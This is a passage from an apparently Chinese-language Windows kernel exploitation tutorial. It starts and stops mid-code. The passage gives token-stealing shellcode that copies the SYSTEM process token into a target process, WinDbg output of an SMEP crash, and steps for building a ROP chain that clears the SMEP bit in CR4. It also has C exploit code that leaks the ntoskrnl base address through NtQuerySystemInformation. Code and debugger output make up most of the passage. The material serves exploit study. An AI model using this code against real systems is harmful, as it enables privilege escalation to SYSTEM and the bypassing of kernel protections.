            SearchSystemPID:
            mov eax, [eax + FLINK_OFFSET]; Get nt!_EPROCESS.ActiveProcessLinks.Flink
            sub eax, FLINK_OFFSET
            cmp[eax + PID_OFFSET], edx; Get nt!_EPROCESS.UniqueProcessId
            jne SearchSystemPID
            mov edx, [eax + TOKEN_OFFSET]; Get SYSTEM process nt!_EPROCESS.Token
            mov[ecx + TOKEN_OFFSET], edx; Replace target process nt!_EPROCESS.Token
            ; with SYSTEM process nt!_EPROCESS.Token
            ; End of Token Stealing Stub
            popad; Restore registers state
            ; Kernel Recovery Stub
            xor eax, eax; Set NTSTATUS SUCCEESS
            add esp, 12; Fix the stack
            pop ebp; Restore saved EBP
            ret 8; Return cleanly
        }
    }
    HANDLE GetDeviceHandle() {
        HANDLE hRet = NULL;
        hRet = CreateFile(
            DEVICE_NAME,
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
            NULL
        );
        if (hRet == INVALID_HANDLE_VALUE) {
            std::cout  t
    00f214b0 53              push    ebx
    1: kd> u 00f214b0
    00f214b0 53              push    ebx
    00f214b1 56              push    esi
    00f214b2 57              push    edi
    00f214b3 60              pushad
    00f214b4 33c0            xor     eax,eax
    00f214b6 648b8024010000  mov     eax,dword ptr fs:[eax+124h]
    00f214bd 8b4050          mov     eax,dword ptr [eax+50h]
    00f214c0 8bc8            mov     ecx,eax
乍一看好像是成功的，但是如果让程序继续执行的话就会爆出如下的错误:
    1: kd> t
    KDTARGET: Refreshing KD connection
    *** Fatal System Error: 0x000000fc
                           (0x00F214B0,0x25EEE125,0xA37449A0,0x80000005)
    A fatal system error has occurred.
    Debugger entered on first try; Bugcheck callbacks have not been invoked.
    A fatal system error has occurred.
这个错误码的意思是`ATTEMPTED EXECUTE ON NOEXECUTE MEMORY`，因为从Win 8.1 开始，Windows
就有了一种新的保护措施，叫做`Supervisor Mode Execution Prevention(SMEP)`。在这个保护下，不能在ring 0
的环境中执行 ring 3的代码。到了这个时候，就需要使用一些特殊的手段关闭这个特性。最常见的手段就是利用 **ROP**
攻击，修改`cr4`寄存器内容。一个常见的函数就是:
    .text:00401000
    ...
    .text:0048BF1D                 pop     eax
    .text:0048BF1E                 retn
    KeFlushCurrentTb
    .text:0057DF86                 mov     cr4, eax
    .text:0057DF89                 retn
    ; 这里用IDA观察有一个bug(?)，内存中的一些值没有按照真正的值进行映射（也可能是相对偏移的锅？）然后导致一些数据的位置不对。。。最后的偏移量需要动态调试得到
利用这个ROP，让RCX赋值为CR4。不过这里注意一点，由于这里使用的，此时如果使用IDA观察的话，需要知道当前段映射的真正偏移量。这个可以通过观察如下的特征知道:
    .text:00401000 ; Section 1. (virtual address 00001000)
    .text:00401000 ; Virtual size                  : 00295B24 (2710308.)
    .text:00401000 ; Section size in file          : 00295C00 (2710528.)
每个段开头都会有一个`virtual address`，这个值表示的是当前段会映射的地址，具体计算方式为`real_address =
image_base_address + virtual_address`。也就是说此时的`.text`段在内存中的真正的地址为:  
`real_text = image_base_address + 0x1000`
然后我们需要观察cr4此时的正确的值。首先我们找到储了问题时的cr4:
    For analysis of this file, run !analyze -v
    nt!RtlpBreakWithStatusInstruction:
    81b66484 cc              int     3
    1: kd> r cr4
    cr4=001406e9
上网查找可知，第20bit为1表示的是SMEP打开（记得从低位往高位数，并且第一位数字是第0bit，第二位数字是第1bit），那么我们只需要将这一bit置0，即可以将这种防护关闭，此时也就是将值改成`0x0406e9`。  
有了ROP，那么我们就需要一个泄露内核地址的途径。这里有两种不同的方式，一个叫做:`EnumDrivers`的API，另一种是利用`NtQueryInformationSystem`的方式获取。前者是官方给出的API，通过调用直接获取地址，而后者是则是通过逆向分析+动态调试，验证可知当前的地址空间上存放的是`ntoskrl.exe`的基地址。  
前者直接就是一个API:
    BOOL EnumDeviceDrivers(
      LPVOID  *lpImageBase,
      DWORD   cb,
      LPDWORD lpcbNeeded
    );
并且据观察，返回的地址数组中`lpImageBase`，第一个就是`ntoskrl.exe`的基地址。不过使用这个方法的时候，需要用到管理员权限。  
这里打算用第一种方法实现地址泄露，第二种攻击方法参考  
这里贴出用`NtQueryInformationSystem`的exp
    typedef enum _SYSTEM_INFORMATION_CLASS {
        SystemBasicInformation = 0,
        SystemPerformanceInformation = 2,
        SystemTimeOfDayInformation = 3,
        SystemProcessInformation = 5,
        SystemProcessorPerformanceInformation = 8,
        SystemModuleInformation = 11,
        SystemInterruptInformation = 23,
        SystemExceptionInformation = 33,
        SystemRegistryQuotaInformation = 37,
        SystemLookasideInformation = 45
    } SYSTEM_INFORMATION_CLASS;
    typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
        HANDLE Section;
        PVOID MappedBase;
        PVOID ImageBase;
        ULONG ImageSize;
        ULONG Flags;
        USHORT LoadOrderIndex;
        USHORT InitOrderIndex;
        USHORT LoadCount;
        USHORT OffsetToFileName;
        UCHAR FullPathName[256];
    } SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;
    typedef struct _SYSTEM_MODULE_INFORMATION {
        ULONG NumberOfModules;
        SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
    } SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;
    typedef struct _ROP {
        PUCHAR PopRcxRet;
        PUCHAR Cr4RegValue;
        PUCHAR MovCr4EcxRet;
    } ROP, *PROP;
    typedef NTSTATUS(NTAPI *_NtQuerySystemInformation)(
        SYSTEM_INFORMATION_CLASS SystemInformationClass,
        PVOID SystemInformation,
        ULONG SystemInformationLength,
        PULONG ReturnLength
        );
    __int64* GetKernelBase()
    {
        DWORD len;
        PSYSTEM_MODULE_INFORMATION ModuleInfo;
        __int64 *kernelBase = NULL;
        _NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)
            GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQuerySystemInformation");
        if (NtQuerySystemInformation == NULL) {
            return NULL;
        }
        NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
        ModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!ModuleInfo)
        {
            return NULL;
        }
        NtQuerySystemInformation(SystemModuleInformation, ModuleInfo, len, &len);
        kernelBase = (__int64*)ModuleInfo->Module[0].ImageBase;
        VirtualFree(ModuleInfo, 0, MEM_RELEASE);
        return kernelBase;
    }
回到正文，此时代码修改如下:
    VOID TokenStealingPayloadWin7() {
        // Importance of Kernel Recovery
        __asm {